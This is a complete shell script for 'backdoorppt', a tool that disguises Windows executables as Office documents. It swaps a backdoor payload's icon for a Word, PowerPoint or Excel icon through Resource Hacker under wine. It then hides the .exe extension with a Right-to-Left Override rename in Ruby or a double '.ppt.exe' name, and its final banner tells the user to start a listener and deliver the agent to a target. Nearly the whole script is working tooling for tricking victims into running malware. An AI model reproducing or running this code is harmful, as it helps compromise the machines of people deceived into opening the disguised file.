#!/bin/sh
###
# backdoorppt - A MS Office spoof extensions tool
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.6
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
# codename: strange things happen under windows
#
# [ TOOL DESCRIPTION ]
# This tool Supports wine 32 or 64 bits installations
# Available with 6 icons to change (backdoorppt/icons)
# Available 2 diferent name transformations methods (ruby or bash)
# 1 - Right to Left Override (nameexe.ppt) <-- ruby
# 2 - Hide Extensions for Known File Types (name.ppt.exe) <-- bash
###




#
# Colorise shell Script output leters
#
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}




#
# variable declarations
#
VeR="1.6"
ArCh=`arch`
IPATH=`pwd`
HoME=`echo ~`
HkLm=`cat $HoME/.wine/system.reg | egrep -m 1 'ProductName' | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1 # wine windows version
#
# Read options (configurations) from settings file ..
#
tRan=`cat $IPATH/settings | egrep -m 1 "BASH_TRANSFORMATION" | cut -d '=' -f2` > /dev/null 2>&1
ByPa=`cat $IPATH/settings | egrep -m 1 "RESOURCEHACKER_BYPASS" | cut -d '=' -f2` > /dev/null 2>&1



#
# configuring correct arch
#
if [ "$ArCh" = "i686" ]; then
  dEd="x86"
  arch="wine"
  PgFi="Program Files"
else
  dEd="x64"
  arch="wine64"
  PgFi="Program Files (x86)"
fi
#
# Resource hacker install path (local)
#
RhI="$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe"



#
# Tool banner
#
cat << !

    +-+-+-+-+-+-+-+-+-+-+-+-+---+
    |b|a|c|k|d|o|o|r|p|p|t|:|$VeR|
    +-+-+-+-+-+-+-+-+-+-+-+-+---+
    'Office spoof extensions tool'
    Credits: Damon Mohammadbagher

!


Colors;
#
# check for dependencies
#
echo ${BlueF}[☆]${white} Checking backend applications .. ${Reset};
sleep 1
if [ "$tRan" = "YES" ]; then
echo "running default transformation method" > /dev/null 2>&1
else
apc=`which ruby`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[x]${white} Ruby interpreter '->' ${RedF}not found! ${Reset};
echo ${RedF}[x]${white} This script requires ruby to work! ${Reset};
sleep 1
exit
else
echo ${BlueF}[☆]${white}" Ruby installation   : ${GreenF}found! "${Reset};
sleep 1
fi
fi

# search for wine installation
apc=`which wine`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[x]${white} Wine installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[x]${white} This script requires wine to work! ${Reset};
echo ${RedF}[x]${white} Please run: sudo apt-get install wine ${Reset};
echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white}" Wine installation   : ${GreenF}found! "${Reset};
sleep 1
fi

# search for zenity installation
apc=`which zenity`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[x]${white} Zenity installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[x]${white} This script requires Zenity to work! ${Reset};
echo ${RedF}[x]${white} Please run: sudo apt-get install zenity ${Reset};
echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white}" Zenity installation : ${GreenF}found! "${Reset};
sleep 1
fi

# search for xterm installation
apc=`which xterm`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[x]${white} Xterm installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[x]${white} This script requires xterm to work! ${Reset};
echo ${RedF}[x]${white} Please run: sudo apt-get install xterm ${Reset};
echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white}" Xterm installation  : ${GreenF}found! "${Reset};
sleep 1
fi

#
# Bypass Resource hacker funtion (replace icon)
# OR search if drive_c correct folder exists
#
if [ "$ByPa" = "NO" ]; then
  if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
    echo ${BlueF}[☆]${white}" Wine $PgFi  : ${GreenF}found! "${Reset};
    sleep 1
  else
    echo ${RedF}[x]${white} Wine $PgFi '->' ${RedF}not found! ${Reset};
    echo ${RedF}[x]${white} $HoME/.wine/drive_c/$PgFi ${Reset};
    sleep 1
    echo ${RedF}[x]${white} Please wait, running winecfg! ${Reset};
    winecfg > /dev/null 2>&1
    echo ""
    # List directorys just to be sure ..
    echo ${RedF}Listing drive_c directorys: ${Reset};
    ls $HoME/.wine/drive_c
    echo ""
    sleep 1
    exit
  fi
fi



#
# START OF SCRIPT FUNTIONS ..
#
rUn=$(zenity --question --title="☠ BackdoorPPt ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# orginal payload full-path variable
UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED (.exe) ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
# icon replacement variable
if [ "$ByPa" = "NO" ]; then
IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "Microsoft-Word-2016.ico" FALSE "Microsost-Word-2013.ico" FALSE "Powerpoint-green.ico" FALSE "Powerpoint-blue.ico" FALSE "Powerpoint-orange.ico" FALSE "Microsoft-Excel.ico" FALSE "Input your own icon" --width 350 --height 310) > /dev/null 2>&1
  #
  # User have decided to input is own icon.ico file ..
  # So, were is it ? (your icon.ico full path) ..
  #
  if [ "$IcOn" = "Input your own icon" ]; then
    ImR=$(zenity --title "☠ ICON REPLACEMENT ☠" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
    PaTh="$ImR"
  else
    PaTh="$IPATH/icons/$IcOn"
  fi
fi
#
# Input payload output name ..
# And check if inputed program its one .exe binarie ..
#
MiP=$(zenity --entry --title "☠ PAYLOAD FINAL NAME ☠" --text "example: curriculum" --width 300) > /dev/null 2>&1
che=`echo $UpL | cut -d '.' -f2`
if ! [ "$che" = "exe" ]; then
  echo ""
  echo ${RedF}[x] ABORT:${YellowF} Only [${white}.exe${YellowF}] binaries are accepted .. ${Reset};
  sleep 2
  exit
fi

  #
  # If RH BYPASS its not active (settings file)
  #
  if [ "$ByPa" = "NO" ]; then
    #
    # Config WINE windows version (if not supported) ..
    #
    if ! [ "$HkLm" = "Microsoft Windows 7" ]; then
      echo ${RedF}[x]${white} Wine system detected: $HkLm ${Reset};
      echo ${RedF}[x]${white} FakeImageExploiter requires: windows 7 version ..${Reset};
      echo ${YellowF}[☆] Starting winecfg, Please sellect required version ..${Reset};
      sleep 1
      winecfg > /dev/null 2>&1
    fi

    #
    # Check for resource hacker installation (wine)
    #
    if [ -f "$RhI" ]; then
      echo ${BlueF}[☆]${white}" ResourceHacker.exe  : ${GreenF}found! "${Reset};
      sleep 1
    else
      echo ${RedF}[x]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
      sleep 1
cat << !

    Installing ResourceHacker under .wine directorys... 
    Version:windows7 Arch:$dEd Path:drive_c/$PgFi
    $HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe

!
      sleep 3
      xterm -T "BackdoorPPt" -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
      echo ${YellowF}[⊶]${white} Please wait, restarting tool! ${Reset};
      echo ${YellowF}[⊶]${white} For proper ResourceHacker.exe Instalation! ${Reset};
      sleep 2
      exit
    fi

    #
    # wine command to call resourcehacker and add an MS-WORD.ico to the backdoor
    #
    echo ${YellowF}[☆] Working on backdoor agent .. ${Reset};
    sleep 1
    echo ${BlueF}[☆]${white}" Transforming backdoor agent    : ${GreenF}done .. "${Reset};
    $arch "$RhI" -open "$UpL" -save "$IPATH/output/backdoor.exe" -action addskip -res "$PaTh" -mask ICONGROUP,MAINICON,
    echo ${BlueF}[☆]${white}" Change backdoor agent icons    : ${GreenF}done .. "${Reset};
    sleep 1

  else

    # Copy binary to output folder to be manually transformed ..
    cp $UpL $IPATH/output/backdoor.exe > /dev/null 2>&1
    echo ${YellowF}[☆]${white} Manually change icon.ico sellected ..${Reset};
    echo ${YellowF}[☆]${white} Use your favorite editor to change icon [backdoor.exe]${Reset};
    echo ${YellowF}[☠] When finish, press any key to Continue ..${Reset};
    # Waiting for you to finish (read op) ..
    read op

  fi


    #
    # insert .ppt hidden extension
    #
    echo ${BlueF}[☆]${white}" Adding agent hidden extensions : ${GreenF}done .. "${Reset};
    # chose ruby or bash transformation
    if [ "$tRan" = "YES" ]; then
      mv $IPATH/output/backdoor.exe  $IPATH/output/$MiP.ppt.exe > /dev/null 2>&1
    else
      mv $IPATH/output/backdoor.exe  $IPATH/output/backdoor_ppt.exe > /dev/null 2>&1
    fi

  sleep 1
  cd $IPATH/output
  # rename backdoor output name
  echo ${BlueF}[☆]${white}" Word doc builder (backdoorppt) : ${GreenF}done .. "${Reset};
  if [ "$tRan" = "YES" ]; then
    echo "bash build" > /dev/null 2>&1
  else
    echo "$MiP" > outname.txt
    #
    # Ruby command to READ 'te.txt' that contains agent output name, then
    # Stores it into 'fil' variable to be able to rename the agent output name ..
    #
    ruby -e 'fil = File.read("outname.txt") and File.rename("backdoor_ppt.exe", "#{fil}\xe2\x80\xaetpp.exe")'
    rm outname.txt > /dev/null 2>&1
  fi
  cd $IPATH
  sleep 1


#
# Display final outputs to user
#
echo ${YellowF}[☆] Task over, Writing reports .. ${Reset};
sleep 2
if [ "$IcOn" = "Input your own icon" ]; then
IcOn="$PaTh"
fi

  if [ "$tRan" = "YES" ]; then
    echo ""
    echo ${RedF}"    Icon select : $IcOn"${Reset};
    echo ${RedF}"    Final file  : $IPATH/output/$MiP.ppt.exe"${Reset};
    echo ${RedF}"    Tool Author : r00t-3xp10it (SSA RedTeam)"${Reset};
  else
    echo ""
    dre="exe.ppt"
    echo ${RedF}"    Icon select : $IcOn"${Reset};
    echo ${RedF}"    Final file  : $IPATH/output/$MiP$dre"${Reset};
    echo ${RedF}"    Tool Author : r00t-3xp10it (SSA RedTeam)"${Reset};
  fi

cat << !

    Your backdoor agent its now transformed into one fake
    word doc (ppt) remmenber that .exe extensions will not
    be 'visible' under windows systems, because the system
    default behavior its: NOT show hidden extensions...

    We are now ready to start a handler (listener) and
    deliver the transformed agent to the target machine.

!
#
# The user dont want to run the tool (aborted switch) ..
#
else
  echo ${RedF}[x]${white} Aborting all tasks ..${Reset};
  sleep 2
fi
# exit tool, and good nigth ..
exit
